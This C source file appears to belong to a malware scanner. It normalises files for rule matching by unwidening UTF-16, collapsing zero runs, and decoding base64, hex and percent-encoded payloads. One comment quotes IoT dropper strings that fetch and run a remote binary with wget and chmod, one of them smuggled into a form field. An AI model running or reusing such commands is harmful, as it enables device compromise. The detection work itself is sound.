/*
 * executables.c - see executables.h.
 *
 * ONE PASS, AND THE ORDER INSIDE IT IS DECIDED RATHER THAN INCIDENTAL.
 *
 * At each position the wide test runs before the zero test. In practice they
 * never both fire - the zeros inside a UTF-16 run are single bytes and the zero
 * rule needs eight in a row - but "never in practice" is the sort of thing that
 * stops being true, and a reader should not have to work out which wins.
 */

#include <string.h>

#include "executables.h"

/* Printable ASCII, which is what a widened marker is made of. Control bytes are
 * refused: a run of "02 00 03 00" is a table of small integers, and reading it
 * as text is how structure gets rewritten as prose. */
static int wide_char(uint8_t lo, uint8_t hi)
{
	return hi == 0u && lo >= 0x20u && lo < 0x7fu;
}

/* How many UTF-16LE characters start at `i`, counted in CHARACTERS. */
static uint64_t wide_run(const uint8_t *p, uint64_t n, uint64_t i)
{
	uint64_t k = 0;

	while (i + 2u * k + 1u < n && wide_char(p[i + 2u * k], p[i + 2u * k + 1u]))
		k++;
	return k;
}

/* How many zero bytes start at `i`. */
static uint64_t zero_run(const uint8_t *p, uint64_t n, uint64_t i)
{
	uint64_t k = 0;

	while (i + k < n && p[i + k] == 0u)
		k++;
	return k;
}

/*
 * Open or extend a span.
 *
 * A COPY that follows a COPY is the same stretch seen twice - the walk emits a
 * byte at a time - so it is merged rather than recorded again. Without this a
 * file with no zero runs and no wide text would produce one span per byte,
 * which is the opposite of what the map is for.
 */
static int span_put(struct kof_exe_norm_span *spans, uint32_t cap, uint32_t *n,
		    uint8_t kind, uint64_t src_off, uint64_t src_len,
		    uint64_t dst_off, uint64_t dst_len)
{
	struct kof_exe_norm_span *s;

	if (!spans)
		return 1;                       /* the caller does not want them */
	if (*n && kind == KOF_EXE_NORM_COPY) {
		s = &spans[*n - 1u];
		if (s->kind == KOF_EXE_NORM_COPY &&
		    s->src_off + s->src_len == src_off &&
		    s->dst_off + s->dst_len == dst_off) {
			s->src_len += src_len;
			s->dst_len += dst_len;
			return 1;
		}
	}
	if (*n >= cap)
		return 0;
	s = &spans[(*n)++];
	s->src_off = src_off;
	s->src_len = src_len;
	s->dst_off = dst_off;
	s->dst_len = dst_len;
	s->kind    = kind;
	return 1;
}

uint64_t kof_exe_norm(const uint8_t *in, uint64_t n, uint32_t ops,
		  uint8_t *out, uint64_t cap,
		  struct kof_exe_norm_span *spans, uint32_t span_cap,
		  uint32_t *n_spans)
{
	uint64_t i = 0, o = 0;
	uint32_t ns = 0;
	int changed = 0;

	if (n_spans)
		*n_spans = 0;
	if (!in || !out || !n || cap < n || !ops)
		return 0;

	while (i < n) {
		uint64_t k;

		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (k = wide_run(in, n, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			uint64_t j;

			for (j = 0; j < k; j++)
				out[o + j] = in[i + 2u * j];
			if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_UNWIDENED,
				      i, 2u * k, o, k))
				return 0;
			i += 2u * k;
			o += k;
			changed = 1;
			continue;
		}
		if ((ops & KOF_EXE_NORM_NULLRUN) &&
		    (k = zero_run(in, n, i)) >= KOF_EXE_NORM_NULL_MIN) {
			/*
			 * TWO, NOT ONE, AND NOT NONE - see the safety note in
			 * executables.h. Two zeros keep every zero-free pattern
			 * answering exactly as it did on the original.
			 */
			out[o] = 0u;
			out[o + 1u] = 0u;
			if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_NULLS,
				      i, k, o, 2u))
				return 0;
			i += k;
			o += 2u;
			changed = 1;
			continue;
		}
		out[o] = in[i];
		if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_COPY, i, 1u, o, 1u))
			return 0;
		i++;
		o++;
	}

	if (!changed)
		return 0;               /* the common case - see executables.h */
	if (n_spans)
		*n_spans = ns;
	return o;
}

int kof_exe_norm_src_of(const struct kof_exe_norm_span *spans, uint32_t n_spans,
		    uint64_t dst, uint64_t *src)
{
	uint32_t lo = 0, hi = n_spans;

	if (!spans || !n_spans || !src)
		return 0;
	/* The spans cover the output with no holes and in order, so this is an
	 * ordinary binary search on dst_off. */
	while (lo < hi) {
		uint32_t mid = lo + (hi - lo) / 2u;
		const struct kof_exe_norm_span *s = &spans[mid];

		if (dst < s->dst_off) {
			hi = mid;
		} else if (dst >= s->dst_off + s->dst_len) {
			lo = mid + 1u;
		} else {
			uint64_t k = dst - s->dst_off;

			switch (s->kind) {
			case KOF_EXE_NORM_UNWIDENED:
				*src = s->src_off + 2u * k;
				break;
			case KOF_EXE_NORM_NULLS:
				/* Every byte of the run is zero, so the head of
				 * it is as true an answer as any byte inside. */
				*src = s->src_off;
				break;
			default:
				*src = s->src_off + k;
				break;
			}
			return 1;
		}
	}
	return 0;
}

int kof_exe_unwide(const uint8_t *in, uint64_t n, uint8_t *out)
{
	uint64_t i = 0;
	int changed = 0;

	if (!in || !out || !n)
		return 0;
	memcpy(out, in, (size_t)n);
	while (i + 1u < n) {
		uint64_t k = wide_run(in, n, i);

		if (k < KOF_EXE_NORM_WIDE_MIN) {
			i++;
			continue;
		}
		{
			uint64_t j;

			for (j = 0; j < k; j++)
				out[i + j] = in[i + 2u * j];
			/* The vacated half of the run. Zeros, because a literal
			 * cannot contain one, so nothing can match across it. */
			memset(out + i + k, 0, (size_t)k);
		}
		i += 2u * k;
		changed = 1;
	}
	return changed;
}

/*
 * THE BASE64 PASS. See the note on kof_exe_unb64 in the header for why it is
 * here at all; what follows is why each test is the test it is, and every one
 * of those reasons was worked out in bases/decomp/cmdb64_00.c against real
 * droppers rather than reasoned out here.
 */

/* How far back a separator run may reach between the payload and the decoder.
 * "  |  " is five; longer than this is not a pipeline, it is two unrelated
 * things that happen to be near each other. */
#define B64_SEP_MAX   8u

/* The longest payload walked back over. Past every measured dropper one-liner,
 * and small enough that a hostile file cannot make the walk expensive by
 * putting the anchor after a megabyte of printable bytes. */
#define B64_PAY_MAX   8192u

/* Below this a run is not a payload. Sixteen characters decode to twelve bytes,
 * which is shorter than any second stage worth having and is about where
 * ordinary words stop being mistakable for one. */
#define B64_RUN_MIN   16u

/* What one pass will rewrite. A command carries one payload; a file with more
 * anchors than this is doing something other than dropping, and the cap is what
 * stops a crafted file turning one normalisation into thousands of 8 KB walks. */
#define B64_MAX_PAY   8u

/* The alphabet, as comparisons. A table would be faster and this is not the hot
 * path - it runs only where the anchor already matched. */
static int b64_val(uint8_t c)
{
	if (c >= 'A' && c <= 'Z') return c - 'A';
	if (c >= 'a' && c <= 'z') return c - 'a' + 26;
	if (c >= '0' && c <= '9') return c - '0' + 52;
	if (c == '+') return 62;
	if (c == '/') return 63;
	return -1;
}

/* A character that may appear INSIDE a run: the alphabet, its padding, and the
 * line breaks a wrapped payload carries. */
static int b64_run_char(uint8_t c)
{
	return b64_val(c) >= 0 || c == '=' || c == '\n' || c == '\r';
}

/*
 * IS THERE A DECODER AT `i`, and which spelling.
 *
 * Returns its length, or 0. `base64 -d` is a prefix of `base64 -di`, so the
 * short form finds both; `--decode` and the macOS `-D` share no prefix with it
 * and are tested separately. One search for "base64 -" covers all three, where
 * the module declared three strings because its search was the database's.
 */
static uint32_t b64_anchor_at(const uint8_t *p, uint64_t n, uint64_t i)
{
	if (n - i < 9u)                 /* the shortest is "base64 -d" */
		return 0;
	if (memcmp(p + i, "base64 -", 8u))
		return 0;
	/* p[i + 7] is that '-'; what follows it decides the spelling. */
	if (n - i >= 15u && !memcmp(p + i + 7u, "--decode", 8u))
		return 15u;
	if (p[i + 8u] == 'd' || p[i + 8u] == 'D')
		return 9u;
	return 0;
}

static int unb64_range(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct kof_exe_span *wrote, uint32_t cap, uint32_t *n_wrote)
{
	uint64_t i;
	uint32_t made = 0;
	int changed = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = from; i + 8u < to && made < B64_MAX_PAY; i++) {
		uint64_t run_end, run_beg, j;
		uint64_t out_n = 0;
		uint32_t acc = 0, have = 0;
		uint8_t  before;
		int      piped = 0;

		if (!b64_anchor_at(p, n, i))
			continue;

		/*
		 * BACK OVER THE PIPE, THEN BACK OVER THE PAYLOAD.
		 *
		 * In `echo <payload> | base64 -d` the payload is the run that
		 * ENDS at the pipe. Nearest, not longest-in-the-string: a
		 * longer run elsewhere in the same command is a different
		 * question that happens to share the answer most of the time.
		 */
		run_end = i;
		for (j = 0; j < B64_SEP_MAX && run_end > 0; j++) {
			uint8_t c = p[run_end - 1u];

			if (c == '|' || c == '<' || c == '>')
				piped = 1;
			else if (c != ' ' && c != '\t' && c != ')' &&
				 c != '"' && c != '\'')
				break;
			run_end--;
		}
		/*
		 * THE DECODER'S INPUT HAS TO COME FROM THE RUN, and a space
		 * does not say that. `base64 -d` reads stdin, so something must
		 * be piped or redirected into it; a bare space in front means
		 * its input is a file argument and the bytes before it are just
		 * the previous word. Without this,
		 * "ThisIsALongIdentifierLikeString base64 -d" decoded to
		 * twenty-three bytes of noise.
		 *
		 * The quotes are separators rather than terminators because
		 * `echo "<payload>" | base64 -d` is the Mirai shape and the
		 * closing quote sits between the payload and the pipe.
		 */
		if (!piped)
			continue;

		run_beg = run_end;
		for (j = 0; j < B64_PAY_MAX && run_beg > 0; j++) {
			if (!b64_run_char(p[run_beg - 1u]))
				break;
			run_beg--;
		}
		/*
		 * PADDING ONLY EVER COMES LAST, so an `=` with a real
		 * character after it is a SEPARATOR and the payload starts
		 * after the last one. Without it `VAR=<payload> | base64 -d`
		 * walks back through the `=` into the variable's name - which
		 * is base64 characters too - and every group shifts.
		 */
		for (j = run_beg; j + 1u < run_end; j++)
			if (p[j] == '=' && p[j + 1u] != '=')
				run_beg = j + 1u;

		if (run_end - run_beg < B64_RUN_MIN)
			continue;
		/*
		 * AND THE RUN HAS TO BE DELIMITED. A run must not be a window
		 * onto bytes belonging to something else - a symbol table, a
		 * pointer, the tail of another string - and a payload is an
		 * argument, so it follows a NUL, a space, a quote or a bracket.
		 */
		before = run_beg ? p[run_beg - 1u] : 0;
		if (before != 0 && before != ' ' && before != '\t' &&
		    before != '"' && before != '\'' && before != '(' &&
		    before != '=' && before != '\n')
			continue;

		/*
		 * DECODE IN PLACE. The write always trails the read - three
		 * bytes out per four in - so the output cannot overtake what
		 * has not been read yet, and no copy is needed.
		 */
		for (j = run_beg; j < run_end; j++) {
			int v = b64_val(p[j]);

			if (v < 0)
				continue;       /* the padding and the newlines */
			acc = (acc << 6) | (uint32_t)v;
			have += 6u;
			if (have >= 8u) {
				have -= 8u;
				p[run_beg + out_n++] = (uint8_t)(acc >> have);
			}
		}
		/*
		 * A run that decoded to nothing is left exactly as it was.
		 * Zeroing it would remove bytes the matcher can still read for
		 * no gain, and it is the one case where the rewrite would lose
		 * rather than reveal.
		 */
		if (!out_n)
			continue;
		/* The vacated tail. Zeros, for the reason at the top of this
		 * file: a literal cannot contain one, so nothing matches across
		 * it - and it is also what makes a second pass find nothing. */
		memset(p + run_beg + out_n, 0, (size_t)(run_end - run_beg - out_n));
		if (wrote && n_wrote && *n_wrote < cap) {
			wrote[*n_wrote].off = run_beg;
			wrote[*n_wrote].len = out_n;
			(*n_wrote)++;
		}
		made++;
		changed = 1;
	}
	return changed;
}

int kof_exe_unb64(uint8_t *p, uint64_t n)
{
	return unb64_range(p, n, 0, n, NULL, 0, NULL);
}

/*
 * WHERE A PARENT'S OFFSET LANDS IN THE VIEW.
 *
 * The inverse of kof_exe_norm_src_of, and it does not use the span map. The
 * map answers one question at a time from a table that has a row per run - a
 * binary with forty thousand zero runs needs forty thousand rows before the
 * first question can be asked, and the caller here has about thirty questions.
 *
 * So the transform is replayed instead, once, against a SORTED list of the
 * offsets somebody wants to know about. One pass, no table, and it is the same
 * loop as kof_exe_norm above - which is the reason it sits directly beneath it
 * and the reason a test pins the two together rather than trusting the reading.
 *
 * WHAT AN OFFSET INSIDE A COLLAPSED RUN MEANS. Most of such a run has no view
 * byte to point at, so there is a choice to make and it is made the same way in
 * both directions: an offset AT the run's first byte answers with the start of
 * what the run became, and an offset anywhere after it answers with the position
 * just past it.
 *
 * That is what a region table needs. A region beginning where the run begins
 * keeps the two bytes the run collapsed to; a region lying WHOLLY inside the
 * run comes back with a length of zero, which is the truthful answer - it was
 * padding, the padding is gone, and there is nothing in the view for a rule to
 * search. The resolver drops a region of zero length for that reason.
 */
void kof_exe_norm_map(const uint8_t *in, uint64_t n, uint32_t ops,
		      const uint64_t *src, uint64_t *dst, uint32_t k)
{
	uint64_t i = 0, o = 0;
	uint32_t q = 0;

	if (!in || !src || !dst || !k)
		return;
	if (!n || !ops) {
		for (; q < k; q++)
			dst[q] = src[q];
		return;
	}
	while (i < n && q < k) {
		uint64_t step_in, step_out;

		/* Every query this step passes is answered before the step is
		 * taken, so a query landing inside a run gets the run's start. */
		while (q < k && src[q] <= i) {
			dst[q] = o;
			q++;
		}
		if (q == k)
			break;
		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (step_out = wide_run(in, n, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			step_in = 2u * step_out;
		} else if ((ops & KOF_EXE_NORM_NULLRUN) &&
			   (step_in = zero_run(in, n, i)) >=
			   KOF_EXE_NORM_NULL_MIN) {
			step_out = 2u;
		} else {
			step_in = step_out = 1u;
		}
		i += step_in;
		o += step_out;
	}
	/* Anything at or past the end of the input maps to the end of the
	 * view. A region that runs to the last byte is the ordinary case and
	 * its end offset is one past it. */
	for (; q < k; q++)
		dst[q] = o;
}

/*
 * THE SAME TRANSFORM, BUT NOT EVERYWHERE.
 *
 * WHY A BITMAP AND NOT A LIST OF REGIONS. Regions OVERLAP. An ELF's header
 * tables sit inside the first PT_LOAD, so HEADERS and DATA cover some of the
 * same bytes, and a walk that took each region in turn would normalise those
 * bytes as data and then copy them as headers, or the other way round
 * depending on the order the resolver happened to return. A byte either may be
 * rewritten or it may not, so that is what is recorded: one bit per byte, and
 * KEEPING WINS. A byte claimed by both a kept region and a rewritten one is
 * kept, because the reason to keep it has not gone away by being overlapped.
 *
 * WHAT A RUN MAY NOT DO IS STRADDLE. A zero run that begins in data and
 * continues into the header is collapsed only as far as the header, because
 * collapsing the rest would move the header - and the header is kept precisely
 * so that nothing moves it. The run test therefore stops at the first kept
 * byte rather than looking past it.
 *
 * `mark` is a sorted list of parent offsets whose view positions the caller
 * wants back in `mark_out` - the region boundaries, so the view can carry a
 * region table of its own. It is the same service kof_exe_norm_map performs
 * for the unmasked transform, done here in the one pass that already exists
 * rather than by replaying a second one that would have to be kept in step.
 */
static int keep_at(const uint8_t *keep, uint64_t i)
{
	return keep && (keep[i >> 3] & (uint8_t)(1u << (i & 7u)));
}

/*
 * How far a run may reach before it meets a byte that must not move.
 *
 * CACHED BY THE CALLER, WHICH IS NOT AN OPTIMISATION BUT THE DIFFERENCE
 * BETWEEN LINEAR AND QUADRATIC. This walks forward to the next kept byte, so
 * asking it once per output byte scans the whole unkept stretch once per byte
 * of that stretch. On a binary whose kept regions are a few hundred bytes near
 * each end, that is the length of the file squared - measured as a scan that
 * did not finish in ten minutes rather than as a slow one. The caller keeps the
 * answer and asks again only once it has been used up, which makes the total
 * walk linear because `i` never goes backwards.
 */
static uint64_t keep_bound(const uint8_t *keep, uint64_t n, uint64_t i)
{
	uint64_t e = i;

	if (!keep)
		return n;
	while (e < n && !keep_at(keep, e))
		e++;
	return e;
}

uint64_t kof_exe_norm_masked(const uint8_t *in, uint64_t n, const uint8_t *keep,
			     const uint8_t *drop, uint32_t ops, uint8_t *out,
			     uint64_t cap, const uint64_t *mark,
			     uint64_t *mark_out, uint32_t n_mark,
			     uint32_t *fired)
{
	uint64_t i = 0, o = 0, lim = 0;
	uint32_t q = 0, did = 0;
	int changed = 0;

	if (fired)
		*fired = 0;

	if (!in || !out || !n || cap < n)
		return 0;

	while (i < n) {
		uint64_t k;

		while (q < n_mark && mark && mark_out && mark[q] <= i)
			mark_out[q++] = o;

		/*
		 * DROPPED BEFORE ANYTHING ELSE, AND BEFORE KEPT.
		 *
		 * A dropped byte does not reach the view at all, so no rule
		 * about how to rewrite it can apply - and the one region that
		 * is otherwise kept whole, CODE, is exactly where the static
		 * library lives. Tested first because "keep" means "do not
		 * change this byte", not "do not remove it", and the caller
		 * asking for both about one byte means the stronger one.
		 */
		if (keep_at(drop, i)) {
			i++;
			did |= KOF_EXE_NORM_CUTLIB;
			changed = 1;
			lim = 0;        /* the cached run bound is stale now */
			continue;
		}
		if (keep_at(keep, i)) {
			out[o++] = in[i++];
			continue;
		}
		/* Only when the last answer has been used up - see keep_bound.
		 * Bounded by the next DROPPED byte as well, for the reason a
		 * run may not straddle a kept one: collapsing across a hole
		 * would join two stretches that are not adjacent. */
		if (i >= lim) {
			uint64_t d;

			lim = keep_bound(keep, n, i);
			d = keep_bound(drop, n, i);
			if (d < lim)
				lim = d;
		}

		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (k = wide_run(in, lim, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			uint64_t j;

			for (j = 0; j < k; j++)
				out[o + j] = in[i + 2u * j];
			i += 2u * k;
			o += k;
			changed = 1;
			did |= KOF_EXE_NORM_UNWIDE;
			continue;
		}
		if ((ops & KOF_EXE_NORM_NULLRUN) &&
		    (k = zero_run(in, lim, i)) >= KOF_EXE_NORM_NULL_MIN) {
			/* Two, not one - the safety note in executables.h. */
			out[o] = 0u;
			out[o + 1u] = 0u;
			i += k;
			o += 2u;
			changed = 1;
			did |= KOF_EXE_NORM_NULLRUN;
			continue;
		}
		out[o++] = in[i++];
	}
	/* Boundaries at or past the end land at the end of the view, which is
	 * what a region running to the last byte needs. */
	while (q < n_mark && mark_out)
		mark_out[q++] = o;

	if (fired)
		*fired = did;
	if (!changed)
		return 0;
	return o;
}

/* ---- hex text, and the layers under it ----------------------------------- */

/* Twelve bytes. Below it a run is as likely to be a number as a payload - see
 * the measurement in executables.h. */
#define HEX_RUN_MIN   24u

/* What one pass will rewrite, for the reason B64_MAX_PAY gives. */
#define HEX_MAX_PAY   32u

static int hex_val(uint8_t c)
{
	if (c >= '0' && c <= '9') return c - '0';
	if (c >= 'a' && c <= 'f') return c - 'a' + 10;
	if (c >= 'A' && c <= 'F') return c - 'A' + 10;
	return -1;
}

/* What a decoded byte may be for the run to be text: printable ASCII, and the
 * three whitespace characters a command or a hosts file carries. */
static int hex_text(uint8_t c)
{
	return (c >= 0x20u && c < 0x7fu) || c == '\t' || c == '\n' || c == '\r';
}

/* A payload is an argument, so it follows one of these - the same rule the
 * base64 walk applies, and the one that removes the only clean-file decodes
 * the printable test let through. */
static int hex_delim(uint8_t c)
{
	return c == 0 || c == ' ' || c == '\t' || c == '"' || c == '\'' ||
	       c == '(' || c == '=' || c == '\n' || c == '\r' || c == ',' ||
	       c == ';' || c == ':' || c == '>' || c == '|' || c == '{' ||
	       c == '[';
}

static int unhex_range(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct kof_exe_span *wrote, uint32_t cap,
		       uint32_t *n_wrote)
{
	uint64_t i;
	uint32_t made = 0;
	int changed = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = from; i < to && made < HEX_MAX_PAY; ) {
		uint64_t beg, end, j, out_n = 0;
		int text = 1;

		if (hex_val(p[i]) < 0) {
			i++;
			continue;
		}
		beg = i;
		while (i < to && hex_val(p[i]) >= 0)
			i++;
		end = i;
		/* An odd tail is not part of the encoding: two characters make
		 * one byte and a leftover one makes none. */
		if ((end - beg) & 1u)
			end--;
		if (end - beg < HEX_RUN_MIN)
			continue;
		if (!hex_delim(beg ? p[beg - 1u] : 0))
			continue;
		/*
		 * EVERY BYTE, NOT A SAMPLE OF THEM. A prefix test would accept
		 * a hash whose first bytes happened to be printable, and the
		 * whole value of this rule is that it refuses those.
		 */
		for (j = beg; j < end && text; j += 2u)
			text = hex_text((uint8_t)((hex_val(p[j]) << 4)
						  | hex_val(p[j + 1u])));
		if (!text)
			continue;
		/* In place: the write trails the read by half, so it cannot
		 * overtake what has not been read. */
		for (j = beg; j < end; j += 2u)
			p[beg + out_n++] = (uint8_t)((hex_val(p[j]) << 4)
						     | hex_val(p[j + 1u]));
		memset(p + beg + out_n, 0, (size_t)(end - beg - out_n));
		if (wrote && n_wrote && *n_wrote < cap) {
			wrote[*n_wrote].off = beg;
			wrote[*n_wrote].len = out_n;
			(*n_wrote)++;
		}
		made++;
		changed = 1;
	}
	return changed;
}

int kof_exe_unhex(uint8_t *p, uint64_t n)
{
	return unhex_range(p, n, 0, n, NULL, 0, NULL);
}

/* How deep the layering is followed. Two is what real samples carry; four is
 * past every one measured and is what stops a crafted file from turning one
 * normalisation into a loop. */
#define DEC_MAX_ROUND 4u

/* How many decoded stretches are carried into the next round. A file with more
 * than this has been answered enough. */
#define DEC_MAX_SPAN  64u

/* ---- percent-encoded text ------------------------------------------------
 *
 * ONE ESCAPE FORM, NAMED, AND NOT A FAMILY OF THEM.
 *
 * This decodes `%XX` and nothing else. It is not a general escape pass and must
 * not become one: `\xNN`, `\NNN`, `&#NN;` and the rest are different
 * conventions with different delimiters and different false-positive shapes,
 * and each would need its own measurement before it could be let near a
 * scanner's input.
 *
 * WHY THIS ONE. An IoT dropper carries its exploits as URLs and form bodies,
 * and the command inside them is percent-encoded by the protocol rather than by
 * the author:
 *
 *     Cmd=wget+http%3A%2F%2F104.168.11.84%2Fmips+-O+%2Fvar%2Ftmp%2Finit
 *     remote_host=%3bcd+/tmp;wget+http:/...;chmod+777+x86;./x86
 *
 * The bytes a rule would be written against - "wget http://", ";chmod 777" -
 * are not in the file at all; what is there is the same text with its
 * separators spelled in hex. Decoded, one rule matches both the encoded and the
 * plain form, which is what the view is for.
 *
 * WHAT STOPS IT FIRING ON ANYTHING ELSE, in the same three terms the hex pass
 * uses and for the same reasons:
 *
 *   ENOUGH OF THEM. A run must carry PCT_MIN escapes. One `%2e` in a format
 *   string or a version number is not an encoded payload, and a printf format
 *   has at most a couple of `%` in a row that could be read as hex - `%ad`,
 *   `%be` - while an encoded command has many.
 *
 *   ALL PRINTABLE. Every decoded byte must be text, which is what the encoding
 *   exists to carry. A run that decodes to control bytes was not this.
 *
 *   DELIMITED. The run must follow a byte an argument follows - the same test
 *   hex_delim answers - so a window onto the middle of something else cannot
 *   become a payload.
 */
#define PCT_MIN       4u      /* escapes a run must carry to be one */
#define PCT_RUN_MIN   8u      /* and bytes, so a scrap cannot qualify */
#define PCT_MAX_PAY   32u

/* What may sit between the escapes and still be one run: the characters a URL
 * or a form body is made of. Anything else ends it. */
static int pct_body(uint8_t c)
{
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
	       (c >= 'A' && c <= 'Z') ||
	       c == '%' || c == '+' || c == '-' || c == '_' || c == '.' ||
	       c == '~' || c == '/' || c == ':' || c == '&' || c == '=' ||
	       c == '?' || c == '#' || c == ',' || c == ';' || c == '*' ||
	       c == '!' || c == '(' || c == ')' || c == '\'' || c == '@' ||
	       c == '$' || c == '[' || c == ']';
}

static int unpct_range(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct kof_exe_span *wrote, uint32_t cap,
		       uint32_t *n_wrote)
{
	uint64_t i;
	uint32_t made = 0;
	int changed = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = from; i < to && made < PCT_MAX_PAY; ) {
		uint64_t beg, end, j, out_n = 0;
		uint32_t esc = 0;
		int text = 1;

		if (!pct_body(p[i])) {
			i++;
			continue;
		}
		beg = i;
		while (i < to && pct_body(p[i]))
			i++;
		end = i;
		if (end - beg < PCT_RUN_MIN)
			continue;
		if (!hex_delim(beg ? p[beg - 1u] : 0))
			continue;
		/* Count them and read them in one pass: a `%` that is not
		 * followed by two hex digits is an ordinary byte here, not a
		 * malformed escape - the run is text either way. */
		for (j = beg; j < end && text; j++) {
			if (p[j] != '%')
				continue;
			if (j + 2u >= end ||
			    hex_val(p[j + 1u]) < 0 || hex_val(p[j + 2u]) < 0)
				continue;
			esc++;
			text = hex_text((uint8_t)((hex_val(p[j + 1u]) << 4) |
						  hex_val(p[j + 2u])));
			j += 2u;
		}
		if (!text || esc < PCT_MIN)
			continue;
		/*
		 * DECODE IN PLACE. The write trails the read - three bytes in
		 * for one out at every escape, one for one elsewhere - so the
		 * output cannot overtake what has not been read.
		 */
		for (j = beg; j < end; j++) {
			if (p[j] == '%' && j + 2u < end &&
			    hex_val(p[j + 1u]) >= 0 &&
			    hex_val(p[j + 2u]) >= 0) {
				p[beg + out_n++] =
					(uint8_t)((hex_val(p[j + 1u]) << 4) |
						  hex_val(p[j + 2u]));
				j += 2u;
				continue;
			}
			/* `+` is a space in a form body, and the commands this
			 * carries are separated by them. Left alone, the
			 * decoded text reads "wget+http://..." and a rule
			 * written on the plain command still misses. */
			p[beg + out_n++] = p[j] == '+' ? (uint8_t)' ' : p[j];
		}
		/* The vacated tail. Zeros, for the reason at the top of this
		 * file. */
		memset(p + beg + out_n, 0, (size_t)(end - beg - out_n));
		if (wrote && n_wrote && *n_wrote < cap) {
			wrote[*n_wrote].off = beg;
			wrote[*n_wrote].len = out_n;
			(*n_wrote)++;
		}
		made++;
		changed = 1;
	}
	return changed;
}

int kof_exe_decode(uint8_t *p, uint64_t n)
{
	struct kof_exe_span cur[DEC_MAX_SPAN], nxt[DEC_MAX_SPAN];
	uint32_t n_cur = 1, n_nxt, r, k;
	int changed = 0;

	if (!p || !n)
		return 0;
	cur[0].off = 0;
	cur[0].len = n;

	for (r = 0; r < DEC_MAX_ROUND && n_cur; r++) {
		n_nxt = 0;
		for (k = 0; k < n_cur; k++) {
			uint64_t a = cur[k].off;
			uint64_t b = a + cur[k].len;

			if (!cur[k].len)
				continue;
			/*
			 * Base64 first, because its anchor is a decoder named
			 * in the text and hex has no anchor at all - so where
			 * both could read the same run, the one that was told
			 * what it is reads it.
			 */
			changed |= unb64_range(p, n, a, b, nxt, DEC_MAX_SPAN,
					       &n_nxt);
			changed |= unhex_range(p, n, a, b, nxt, DEC_MAX_SPAN,
					       &n_nxt);
			/* Last of the three: its runs are the widest - a URL
			 * is mostly ordinary characters - so a base64 or hex
			 * payload sitting inside one is read as itself first
			 * and this only sees what is left. */
			changed |= unpct_range(p, n, a, b, nxt, DEC_MAX_SPAN,
					       &n_nxt);
		}
		for (k = 0; k < n_nxt; k++)
			cur[k] = nxt[k];
		n_cur = n_nxt;
	}
	return changed;
}
